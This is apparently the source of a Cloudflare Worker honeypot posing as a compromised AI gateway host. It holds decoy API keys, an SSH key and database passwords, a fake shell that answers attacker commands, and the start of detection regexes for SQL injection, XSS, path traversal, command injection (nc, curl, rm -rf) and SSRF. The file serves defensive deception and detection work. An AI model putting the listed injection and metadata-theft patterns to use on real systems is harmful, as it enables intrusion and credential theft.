// OpenClaw Honeypot v2 - Cloudflare Worker

// ============================================================
// SECTION 1: CONFIGURATION
// ============================================================
const HONEYPOT_VERSION = '2026.3.12';
const FAKE_NODE_VERSION = '22.16.0';
const MAX_ADMIN_ATTEMPTS = 5;
const BAN_DURATION_MS = 24 * 60 * 60 * 1000;
const ADMIN_SESSION_DURATION_MS = 3600 * 1000;
const PAGE_SIZE = 20;
const SEVERITY_RANK = { CLEAN: 0, LOW: 1, MEDIUM: 2, HIGH: 3, CRITICAL: 4 };

function getFakeStartTime() {
  const now = new Date();
  const s = new Date(now); s.setHours(0, 30, 0, 0);
  if (s > now) s.setDate(s.getDate() - 1);
  return s;
}

// ============================================================
// SECTION 2: FAKE FILESYSTEM
// ============================================================
const FAKE_FS = {
  '/root/.bash_history': `ssh -i ~/.ssh/id_rsa deploy@192.168.1.50\ncd /root\nls -la\ncat config.json\nmysql -h 10.2.1.100 -u admin -pDb@P4ss2026! customers_db\nopenclaw gateway --port 18789 --verbose\ncat ~/.openclaw/openclaw.json\nexport ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8\ncurl -H "Authorization: Bearer ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o" http://localhost:18789/api/v1/status\ngit clone https://ghp_Fk4aX9pZ2mN8rQ1sL6wY3@github.com/internal/company-data.git\nopenclaw channels login --whatsapp\nps aux\nnetstat -tulpn\nhistory`,

  '/root/.bashrc': `# ~/.bashrc\nexport PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"\nexport ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8\nexport OPENAI_API_KEY=sk-proj-Gh7mK2pL9nQ4rT6vX8wY0zA3bC5dE1fJ-KmNpQrStUvWxYz\nexport OPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o\nexport NODE_ENV=production\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\nalias gs='git status'\nalias oc='openclaw'`,

  '/root/.ssh/id_rsa': `-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAARGVmYXVsdAAAABAAAAAGc3NoLXJzYQAAA\nAMBAAEAAAGBAMoF2kXaB9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi\n4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8\nFk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9p\nZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ\n1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3\nvE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7c\nA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2\nhP9oKi4nM6qR8AAAAAwEAAQAAAYBZpY3Fk4aX9pZ2mN8rQ1sL6wY3vE5\nbJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0d\nUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9\noKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6\nqR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4a\nX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8AAAAQEAO3oV\nFk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9p\nZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8AAAAQQDv3rWFk4a\nX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN\n8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8AAAAQQDKoGwFk4aX9pZ\n2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1\nsL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8=\n-----END OPENSSH PRIVATE KEY-----`,

  '/root/.ssh/id_rsa.pub': `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKBdpF2gfaZ9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU= root@openclaw-vps`,

  '/root/.ssh/authorized_keys': `ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKBdpF2gfaZ9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9oKi4nM6qR8Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU= admin@workstation`,

  '/root/.openclaw/openclaw.json': JSON.stringify({
    model: 'claude-opus-4-5',
    provider: 'anthropic',
    anthropicApiKey: 'sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8',
    openaiApiKey: 'sk-proj-Gh7mK2pL9nQ4rT6vX8wY0zA3bC5dE1fJ-KmNpQrStUvWxYz',
    gateway: { port: 18789, bind: '0.0.0.0', hotReload: 'hybrid', auth: { token: 'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o' } },
    agent: { thinking: 'medium', verbose: false, elevatedAccess: true, dmScope: 'main' },
    channels: {
      whatsapp: { enabled: true, phone: '+15554521', allowFrom: ['*'] },
      telegram: { enabled: true, botToken: '7234891029:AAF_Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0d', allowFrom: ['*'] },
      discord: { enabled: true, token: 'MTI0OTg0NzU2MzIxMDg1NDQwMA.Fk4aX9.pZ2mN8rQ1sL6wY3vE5bJ7cA0dU', guildId: '1249847563210854400' },
      slack: { enabled: true, oauthToken: 'slack-token-not-configured', workspace: 'homelab-workspace' },
      signal: { enabled: true, phone: '+15558832', registrationId: 'sig-Fk4aX9pZ2mN8rQ1sL' }
    },
    skills: { autoInstall: true, installed: ['browser','gmail','github','hue','spotify','obsidian','twitter','notion','calendar','weather','news','stocks','home-assistant','custom-api'] }
  }, null, 2),

  '/root/config.json': JSON.stringify({
    database: { host: '10.2.1.100', port: 3306, name: 'customers_db', username: 'admin', password: 'Db@P4ss2026!' },
    redis: { host: '10.2.1.101', port: 6379, password: 'R3d1s2026!' },
    api: { key: 'api-internal-2026-Fk4aX9pZ2m', secret: 'sec-N8rQ1sL6wY3vE5bJ7cA0dU' }
  }, null, 2),

  '/root/customers.db': `SQLite format 3\n\nTABLE: customers\nid | name              | email                    | plan    | api_key\n---|-------------------|--------------------------|---------|------------------------\n1  | Alice Johnson     | alice@techcorp.io        | pro     | ck_live_Fk4aX9pZ2mN8\n2  | Bob Smith         | bob.smith@startup.com    | free    | ck_live_rQ1sL6wY3vE5\n3  | Carol White       | carol@enterprise.co      | enterprise | ck_live_bJ7cA0dUxT2h\n4  | David Lee         | d.lee@fintech.io         | pro     | ck_live_P9oKi4nM6qR8\n5  | Emma Davis        | emma.davis@saas.com      | pro     | ck_live_Gh7mK2pL9nQ4\n...\n(247 rows total)\n\nTABLE: api_usage\n...\n\nTABLE: billing\n...`,

  '/root/deploy.sh': `#!/bin/bash\n# OpenClaw deployment script\nset -e\necho "Deploying OpenClaw to production..."\nssh -i ~/.ssh/id_rsa deploy@192.168.1.50 "cd /opt/openclaw && git pull && npm ci && pm2 restart openclaw"\necho "Deploy complete."`,

  '/root/logs/gateway.log': `[2026-03-13 00:30:01] [INF] Gateway v2026.3.12 starting on :18789\n[2026-03-13 00:30:01] [INF] Loading config /root/.openclaw/openclaw.json\n[2026-03-13 00:30:02] [INF] Provider: anthropic (claude-opus-4-5)\n[2026-03-13 00:30:03] [INF] Channel whatsapp connected\n[2026-03-13 00:30:04] [INF] Channel telegram connected\n[2026-03-13 00:30:05] [INF] Channel discord connected\n[2026-03-13 00:30:05] [WRN] Channel slack token refresh failed: 401\n[2026-03-13 00:30:05] [ERR] Channel signal QR expired\n[2026-03-13 00:30:06] [INF] Gateway ready`,

  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nopenclaw:x:1000:1000:OpenClaw User:/home/openclaw:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin`,

  '/etc/hostname': `openclaw-vps`,
  '/proc/version': `Linux version 5.15.0-91-generic (buildd@lcy02-amd64-007) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023`,
};

// ============================================================
// SECTION 3: FAKE SHELL INTERPRETER
// ============================================================
const LS_ROOT = `total 52\ndrwx------  7 root root 4096 Mar 13 10:00 .\ndrwxr-xr-x 19 root root 4096 Mar 12 09:55 ..\n-rw-------  1 root root  512 Mar 13 08:30 .bash_history\n-rw-r--r--  1 root root 3526 Mar 12 09:55 .bashrc\ndrwx------  2 root root 4096 Mar 12 09:55 .ssh\ndrwxr-xr-x  3 root root 4096 Mar 13 10:00 .openclaw\n-rw-r--r--  1 root root 2048 Mar 13 10:00 config.json\n-rw-------  1 root root 8192 Mar 13 10:00 customers.db\n-rwxr-xr-x  1 root root  892 Mar 12 10:00 deploy.sh\ndrwxr-xr-x  2 root root 4096 Mar 13 10:00 logs\n-rw-r--r--  1 root root  256 Mar 12 09:55 .profile`;

const LS_SSH = `total 24\ndrwx------  2 root root 4096 Mar 12 09:55 .\ndrwx------  7 root root 4096 Mar 13 10:00 ..\n-rw-------  1 root root 2610 Mar 12 09:55 id_rsa\n-rw-r--r--  1 root root  574 Mar 12 09:55 id_rsa.pub\n-rw-r--r--  1 root root  574 Mar 12 09:55 authorized_keys`;

const LS_OPENCLAW = `total 16\ndrwxr-xr-x  3 root root 4096 Mar 13 10:00 .\ndrwx------  7 root root 4096 Mar 13 10:00 ..\n-rw-r--r--  1 root root 2847 Mar 13 10:00 openclaw.json\ndrwxr-xr-x  3 root root 4096 Mar 13 10:00 agents`;

const FAKE_PS = `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.0  21500  1200 ?        Ss   00:30   0:00 /sbin/init\nroot       312  0.0  0.1  15432  4321 ?        Ss   00:30   0:00 /usr/sbin/sshd -D\nroot       891  0.0  0.0  65536  2048 ?        Ss   00:30   0:00 nginx: master process\nwww-data   892  0.0  0.0  66100  1792 ?        S    00:30   0:00 nginx: worker process\nroot      1024  2.3  4.2 876432 87234 ?        Sl   00:30  12:34 node /usr/local/bin/openclaw gateway\nroot      1025  0.1  0.8 312400 16384 ?        Sl   00:30   0:23 node /usr/local/bin/openclaw daemon\nroot      1847  0.0  0.1  24824  4096 pts/0    Ss   14:20   0:00 -bash\nroot      2031  0.0  0.0  11984  1024 pts/0    R+   14:23   0:00 ps aux`;

const FAKE_NETSTAT = `Active Internet connections (only servers)\nProto Recv-Q Send-Q Local Address    Foreign Address  State       PID/Program\ntcp        0      0 0.0.0.0:18789    0.0.0.0:*        LISTEN      1024/node\ntcp        0      0 0.0.0.0:22       0.0.0.0:*        LISTEN       312/sshd\ntcp        0      0 0.0.0.0:80       0.0.0.0:*        LISTEN       891/nginx\ntcp        0      0 0.0.0.0:443      0.0.0.0:*        LISTEN       891/nginx\ntcp6       0      0 :::18789         :::*             LISTEN      1024/node\ntcp6       0      0 :::22            :::*             LISTEN       312/sshd`;

const FAKE_ENV_OUTPUT = `SHELL=/bin/bash\nPWD=/root\nHOME=/root\nUSER=root\nLOGNAME=root\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nNODE_ENV=production\nPORT=18789\nANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8\nOPENAI_API_KEY=sk-proj-Gh7mK2pL9nQ4rT6vX8wY0zA3bC5dE1fJ-KmNpQrStUvWxYz\nOPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o\nOPENCLAW_VERSION=2026.3.12\nDB_HOST=10.2.1.100\nDB_PASSWORD=Db@P4ss2026!\nREDIS_HOST=10.2.1.101\nREDIS_PASSWORD=R3d1s2026!`;

const FAKE_IFCONFIG = `eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n        inet 10.2.1.55  netmask 255.255.0.0  broadcast 10.2.255.255\n        inet6 fe80::216:3eff:fe00:1234  prefixlen 64  scopeid 0x20<link>\n        ether 00:16:3e:00:12:34  txqueuelen 1000  (Ethernet)\n        RX packets 48291  bytes 12348291 (12.3 MB)\n        TX packets 32184  bytes 8921034 (8.9 MB)\n\nlo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10<host>\n        loop  txqueuelen 1000  (Local Loopback)`;

const FAKE_DF = `Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        40G   12G   26G  32% /\ntmpfs           3.9G     0  3.9G   0% /dev/shm\n/dev/sda2       100G   45G   50G  47% /data`;

const FAKE_FREE = `               total        used        free      shared  buff/cache   available\nMem:           7.8Gi       2.3Gi       3.1Gi       124Mi       2.4Gi       5.1Gi\nSwap:          2.0Gi          0B       2.0Gi`;

const FAKE_AWS_META = `ami-id\nami-launch-index\nami-manifest-path\nhostname\ninstance-action\ninstance-id\ninstance-life-cycle\ninstance-type\nlocal-hostname\nlocal-ipv4\nmac\nnetwork/\nplacement/\npublic-hostname\npublic-ipv4\npublic-keys/\nreservation-id\nsecurity-groups`;

const HELP_TEXT = `OpenClaw Gateway Shell v${HONEYPOT_VERSION}\n\nAvailable commands:\n  whoami, id, pwd, hostname, date, uname    - System info\n  ls, cat, find, grep                       - Filesystem\n  ps, netstat, ifconfig, df, free, uptime   - Process/network\n  env, printenv                             - Environment\n  history, echo, clear, exit               - Shell builtins\n  openclaw, node, npm, python3, git         - Application\n  ssh, curl, wget, mysql                    - Network tools\n  chmod, chown, sudo                        - Permissions`;

function resolveFilePath(rawPath) {
  const p = rawPath.replace(/^~/, '/root').replace(/\/+$/, '');
  return p || '/root';
}

function executeShellCommand(cmd) {
  if (!cmd || !cmd.trim()) return { stdout: '', stderr: '', exit_code: 0 };
  const raw = cmd.trim();

  // Handle pipes by only processing first part
  const mainCmd = raw.split('|')[0].trim();
  const parts = mainCmd.match(/(?:[^\s"']+|"[^"]*"|'[^']*')+/g) || [];
  const base = parts[0] || '';
  const args = parts.slice(1).join(' ');
  const argArr = parts.slice(1);

  const ok = (stdout) => ({ stdout, stderr: '', exit_code: 0 });
  const err = (stderr, code = 1) => ({ stdout: '', stderr, exit_code: code });

  // sudo passthrough
  if (base === 'sudo') return executeShellCommand(args);

  switch (base) {
    case 'whoami': return ok('root');
    case 'id': return ok('uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)');
    case 'pwd': return ok('/root');
    case 'hostname': return ok('openclaw-vps');
    case 'clear': return ok('__CLEAR__');
    case 'exit': case 'logout': return ok('logout\nConnection to openclaw-vps closed.');
    case 'help': return ok(HELP_TEXT);
    case 'date': return ok(new Date().toUTCString().replace('GMT', 'UTC'));
    case 'uptime': return ok(` 14:23:01 up 13:52,  1 user,  load average: 0.42, 0.38, 0.31`);
    case 'uname':
      if (args.includes('-a') || args.includes('-r') || args.includes('-s')) {
        return ok('Linux openclaw-vps 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux');
      }
      return ok('Linux');
    case 'ls': case 'dir': {
      const target = argArr.find(a => !a.startsWith('-')) || '';
      const tpath = resolveFilePath(target);
      const showDotFiles = args.includes('-a') || args.includes('-la') || args.includes('-al');
      if (!target || tpath === '/root' || tpath === '~') {
        return ok(LS_ROOT);
      }
      if (tpath.includes('.ssh') || tpath === '/root/.ssh') return ok(LS_SSH);
      if (tpath.includes('.openclaw') || tpath === '/root/.openclaw') return ok(LS_OPENCLAW);
      if (tpath === '/') return ok('bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var');
      if (tpath === '/etc') return ok('apt  bash.bashrc  cron.d  hosts  hostname  nginx  passwd  shadow  ssh  ssl  systemd');
      if (tpath.includes('logs') || tpath === '/root/logs') return ok('total 8\n-rw-r--r-- 1 root root 4821 Mar 13 14:22 gateway.log');
      return err(`ls: cannot access '${target}': No such file or directory`);
    }
    case 'cat': {
      const filePath = argArr.find(a => !a.startsWith('-')) || '';
      const resolved = resolveFilePath(filePath);
      if (FAKE_FS[resolved]) return ok(FAKE_FS[resolved]);
      // try /root prefix
      const withRoot = resolved.startsWith('/') ? resolved : '/root/' + resolved;
      if (FAKE_FS[withRoot]) return ok(FAKE_FS[withRoot]);
      // Handle short names
      if (filePath === 'config.json' || filePath === './config.json') return ok(FAKE_FS['/root/config.json']);
      if (filePath === 'customers.db' || filePath === './customers.db') return ok(FAKE_FS['/root/customers.db']);
      if (filePath === 'deploy.sh' || filePath === './deploy.sh') return ok(FAKE_FS['/root/deploy.sh']);
      return err(`cat: ${filePath}: No such file or directory`);
    }
    case 'ps': return ok(FAKE_PS);
    case 'top': case 'htop': return ok(FAKE_PS + '\n\n(Interactive mode not available in this shell)');
    case 'netstat': case 'ss': return ok(FAKE_NETSTAT);
    case 'env': case 'printenv': return ok(FAKE_ENV_OUTPUT);
    case 'ifconfig': case 'ip': return ok(FAKE_IFCONFIG);
    case 'df': return ok(FAKE_DF);
    case 'free': return ok(FAKE_FREE);
    case 'history': return ok(FAKE_FS['/root/.bash_history'].split('\n').map((l,i)=>` ${String(i+1).padStart(4)}  ${l}`).join('\n'));
    case 'echo': return ok(args.replace(/^["']|["']$/g, ''));
    case 'find': return ok('./config.json\n./.openclaw/openclaw.json\n./deploy.sh');
    case 'grep': {
      if (args.includes('password') || args.includes('pass') || args.includes('key') || args.includes('token')) {
        return ok(`ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8\nOPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o\nDB_PASSWORD=Db@P4ss2026!`);
      }
      return ok('');
    }
    case 'which':
      if (args === 'openclaw') return ok('/usr/local/bin/openclaw');
      if (args === 'node' || args === 'nodejs') return ok('/usr/bin/node');
      if (args === 'python3' || args === 'python') return ok('/usr/bin/python3');
      if (args === 'npm') return ok('/usr/bin/npm');
      if (args === 'git') return ok('/usr/bin/git');
      return err(`which: no ${args} in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin)`);
    case 'chmod': case 'chown': case 'chgrp': case 'touch': case 'mkdir': case 'rm': return ok('');
    case 'mv': case 'cp': return ok('');
    case 'docker':
      if (args.startsWith('ps')) return ok(`CONTAINER ID   IMAGE                   COMMAND                  CREATED        STATUS        PORTS                     NAMES\na3f2e1b9c4d8   openclaw/gateway:latest  "node /app/index.js"     13 hours ago   Up 13 hours   0.0.0.0:18789->18789/tcp  openclaw_gateway\n7c8d9e0f1a2b   redis:7-alpine           "docker-entrypoint.s…"  13 hours ago   Up 13 hours   0.0.0.0:6379->6379/tcp    redis_cache\n2b3c4d5e6f7a   mysql:8.0                "docker-entrypoint.s…"  13 hours ago   Up 13 hours   0.0.0.0:3306->3306/tcp    mysql_db`);
      if (args.startsWith('images')) return ok(`REPOSITORY              TAG       IMAGE ID       CREATED        SIZE\nopenclaw/gateway        latest    sha256:a3f2e1  2 days ago     412MB\nredis                   7-alpine  sha256:7c8d9e  1 week ago     38MB\nmysql                   8.0       sha256:2b3c4d  1 week ago     578MB`);
      if (args.startsWith('inspect')) return ok(JSON.stringify([{Id:'a3f2e1b9c4d8',Name:'/openclaw_gateway',Config:{Env:['ANTHROPIC_API_KEY=sk-ant-api03-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dU-xT2hP9oKi4nM6qR8','NODE_ENV=production','OPENCLAW_GATEWAY_TOKEN=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o']},NetworkSettings:{IPAddress:'172.17.0.2'}}], null, 2));
      if (args.startsWith('exec')) return executeShellCommand(args.replace(/^exec\s+-it\s+\S+\s+/, ''));
      if (args.startsWith('logs')) return ok(FAKE_FS['/root/logs/gateway.log']);
      return ok('');
    case 'kubectl':
      if (args.startsWith('get pods')) return ok(`NAME                               READY   STATUS    RESTARTS   AGE\nopenclaw-gateway-7d4f8b9c5-x2kvp   1/1     Running   0          13h\nredis-6c7d8e9f0-m3nop              1/1     Running   0          13h`);
      if (args.startsWith('get secrets')) return ok(`NAME                      TYPE     DATA   AGE\nopenclaw-secrets          Opaque   4      13h\nregistry-credentials      Opaque   1      13h`);
      if (args.startsWith('get svc') || args.startsWith('get services')) return ok(`NAME               TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)     AGE\nopenclaw-gateway   ClusterIP   10.96.0.1       <none>        18789/TCP   13h\nredis              ClusterIP   10.96.0.2       <none>        6379/TCP    13h`);
      if (args.startsWith('describe secret')) return ok(`Name: openclaw-secrets\nNamespace: default\nData\n====\nANTHROPIC_API_KEY: 56 bytes\nGATEWAY_TOKEN: 46 bytes\nDB_PASSWORD: 14 bytes\nREDIS_PASSWORD: 12 bytes`);
      return ok('');
    case 'crontab':
      if (args === '-l') return ok(`# OpenClaw crontab\n*/5  * * * * /usr/local/bin/openclaw daemon check >> /root/logs/daemon.log 2>&1\n0    * * * * /usr/local/bin/openclaw channels sync >> /root/logs/sync.log 2>&1\n@reboot /usr/local/bin/openclaw gateway --port 18789 --config /root/.openclaw/openclaw.json`);
      return ok('');
    case 'systemctl':
      if (args.includes('status openclaw') || args.includes('status openclaw-gateway')) return ok(`openclaw-gateway.service - OpenClaw AI Gateway\n   Loaded: loaded (/etc/systemd/system/openclaw-gateway.service; enabled)\n   Active: active (running) since today 00:30:01; 13h ago\n  Process: 1024 ExecStart=/usr/local/bin/openclaw gateway\n Main PID: 1024 (node)\n   CGroup: /system.slice/openclaw-gateway.service\n           1024 node /usr/local/bin/openclaw gateway`);
      return ok('');
    case 'openclaw':
      if (args.startsWith('version') || args === '--version' || args === '-v') return ok(`openclaw/${HONEYPOT_VERSION} linux-x64 node-v${FAKE_NODE_VERSION}`);
      if (args.startsWith('status')) return ok(JSON.stringify({ status: 'running', version: HONEYPOT_VERSION, uptime: '13h 52m', channels: { connected: 3, total: 5 }, sessions: { active: 1 } }, null, 2));
      if (args.startsWith('gateway')) return ok(`Gateway running on :18789\nPID: 1024\nModel: claude-opus-4-5`);
      if (args.startsWith('skills list') || args === 'skills') return ok(`Installed skills (14):\n  browser       v2.3.1  [bundled]  enabled\n  gmail         v1.5.0  [managed]  enabled\n  github        v1.3.2  [managed]  enabled\n  hue           v1.2.0  [managed]  enabled\n  spotify       v1.1.4  [managed]  enabled\n  obsidian      v1.0.8  [managed]  enabled\n  twitter       v1.0.3  [managed]  disabled\n  notion        v1.1.0  [managed]  enabled\n  calendar      v1.2.1  [managed]  enabled\n  weather       v1.0.5  [managed]  enabled\n  news          v1.0.2  [managed]  disabled\n  stocks        v1.0.1  [managed]  disabled\n  home-assistant v1.1.2 [managed]  disabled\n  custom-api    v0.9.4  [managed]  enabled`);
      if (args.startsWith('channels')) return ok(`whatsapp  connected  +15554521\ntelegram  connected  @oc_assistant_bot\ndiscord   connected  My Homelab\nslack     error      OAuth token expired\nsignal    error      QR code scan required`);
      if (args.startsWith('config')) return ok(FAKE_FS['/root/.openclaw/openclaw.json']);
      return ok(`openclaw/${HONEYPOT_VERSION}\nRun 'openclaw --help' for usage.`);
    case 'node': case 'nodejs':
      if (args === '--version' || args === '-v') return ok(`v${FAKE_NODE_VERSION}`);
      if (args.startsWith('-e ') || args.startsWith('-p ')) return ok('undefined');
      return ok(`Welcome to Node.js v${FAKE_NODE_VERSION}.\n(To exit, press Ctrl+C again or Ctrl+D or type .exit)`);
    case 'npm':
      if (args === '--version' || args === '-v') return ok('10.8.2');
      if (args.startsWith('install') || args.startsWith('i ')) return ok(`added 142 packages in 4s`);
      return ok('');
    case 'python3': case 'python':
      if (args === '--version' || args === '-V') return ok('Python 3.10.12');
      if (args.startsWith('-c ')) return ok('');
      return ok('Python 3.10.12 (main, Nov 20 2023, 15:14:05)\nType "help", "copyright", "credits" or "license" for more information.\n>>>');
    case 'git':
      if (args.startsWith('clone')) return ok(`Cloning into '${(args.split('/').pop() || 'repo').replace('.git', '')}'...\nremote: Enumerating objects: 1247, done.\nremote: Counting objects: 100% (1247/1247), done.\nReceiving objects: 100% (1247/1247), 2.34 MiB | 8.21 MiB/s, done.`);
      if (args.startsWith('status')) return ok(`On branch main\nYour branch is up to date with 'origin/main'.\nnothing to commit, working tree clean`);
      if (args === 'log' || args.startsWith('log ')) return ok(`commit a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\nAuthor: root <root@openclaw-vps>\nDate:   Thu Mar 13 00:30:00 2026 +0000\n\n    chore: update gateway config`);
      return ok('');
    case 'ssh':
      return err(`ssh: connect to host ${argArr.find(a=>!a.startsWith('-'))||'host'} port 22: Connection timed out`);
    case 'curl': {
      if (args.includes('169.254.169.254')) return ok(FAKE_AWS_META);
      if (args.includes('localhost') || args.includes('127.0.0.1') || args.includes('18789')) {
        return ok(JSON.stringify({ status: 'running', version: HONEYPOT_VERSION }, null, 2));
      }
      return err(`curl: (7) Failed to connect to ${argArr.find(a=>a.startsWith('http'))||'host'} port 80 after 30003 ms: Network unreachable`);
    }
    case 'wget':
      return ok(`--2026-03-13 14:23:01--  ${argArr[0]||'http://example.com'}\nResolving... failed: Network unreachable.`);
    case 'mysql':
      return err(`ERROR 2003 (HY000): Can't connect to MySQL server on '10.2.1.100' (111 "Connection refused")`);
    case 'redis-cli':
      return err(`Could not connect to Redis at 10.2.1.101:6379: Connection refused`);
    case 'ping':
      return err(`ping: connect: Network is unreachable`);
    case 'nmap': case 'masscan': case 'nikto': case 'sqlmap':
      return err(`bash: ${base}: command not found`, 127);
    default:
      if (raw.startsWith('./') || (raw.startsWith('/') && !raw.startsWith('/root') && !raw.startsWith('/etc') && !raw.startsWith('/proc'))) {
        return err(`bash: ${base}: Permission denied`, 126);
      }
      return err(`bash: ${base}: command not found`, 127);
  }
}


// ============================================================
// SECTION 4: ATTACK DETECTION PATTERNS
// ============================================================
const ATTACK_PATTERNS = [
  { name: 'SQL_INJECTION', severity: 'HIGH', patterns: [
    /\bUNION\b[\s\S]{0,50}\bSELECT\b/i,
    /\b(SELECT|INSERT|UPDATE|DELETE|DROP|ALTER|TRUNCATE|EXEC)\b[\s\S]{0,30}\b(FROM|INTO|TABLE)\b/i,
    /'\s*(OR|AND)\s*'?\d/i, /'\s*OR\s*'\w+'\s*=\s*'\w+/i,
    /(SLEEP|BENCHMARK|WAITFOR\s+DELAY)\s*\(/i,
    /\bINFORMATION_SCHEMA\b/i, /xp_cmdshell/i,
    /\b(GROUP_CONCAT|LOAD_FILE|INTO\s+OUTFILE)\b/i, /--\s*$|#\s*$/m,
  ]},
  { name: 'XSS', severity: 'MEDIUM', patterns: [
    /<script[\s\/>]/i, /<\/script>/i, /javascript\s*:/i, /\bon\w+\s*=/i,
    /<iframe[\s\/>]/i, /\beval\s*\(/i, /\balert\s*\([^)]*\)/i,
    /document\.(cookie|write|location)/i, /window\.(location|open)\s*[=(]/i,
  ]},
  { name: 'PATH_TRAVERSAL', severity: 'HIGH', patterns: [
    /\.\.[\/\\]/, /\.\.%2[Ff]/i, /\.\.%5[Cc]/i,
    /\/etc\/(passwd|shadow|hosts|crontab)/i, /\/proc\/self\//i,
    /C:\\(Windows|Users)/i, /boot\.ini/i,
  ]},
  { name: 'COMMAND_INJECTION', severity: 'CRITICAL', patterns: [
    /[;&|`]\s*(ls|cat|id|whoami|curl|wget|bash|sh|python3?|perl|nc|ncat)\b/i,
    /\|\s*(ls|cat|id|whoami|bash|sh)\b/i, /\$\([^)]{1,100}\)/, /`[^`]{1,100}`/,
    /;\s*rm\s+-[rf]/i, /\/bin\/(sh|bash|dash|zsh)/i,
  ]},
  { name: 'SSRF', severity: 'HIGH', patterns: [
    /\b127\.0\.0\.1\b/, /\blocalhost\b/i, /169\.254\.169\.254/,
